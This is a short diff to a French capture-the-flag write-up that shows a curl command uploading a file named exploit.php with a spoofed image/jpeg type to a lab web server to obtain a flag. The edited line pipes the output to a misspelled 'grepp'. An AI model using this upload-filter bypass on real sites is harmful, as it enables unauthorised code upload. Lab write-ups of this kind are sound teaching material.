@@ -13,4 +13,4 @@ en modifiant son header pour obtenir uen page de reponse contenant notre flag.
 
 Traduit en code, cela donne:
 
-"touch exploit.php && curl -F "uploaded=@exploit.php;type=image/jpeg" -F "Upload=ok" "http://10.12.1.107/?page=upload""
+"touch exploit.php && curl -F "uploaded=@exploit.php;type=image/jpeg" -F "Upload=ok" "http://10.12.1.107/?page=upload" | grepp flag"
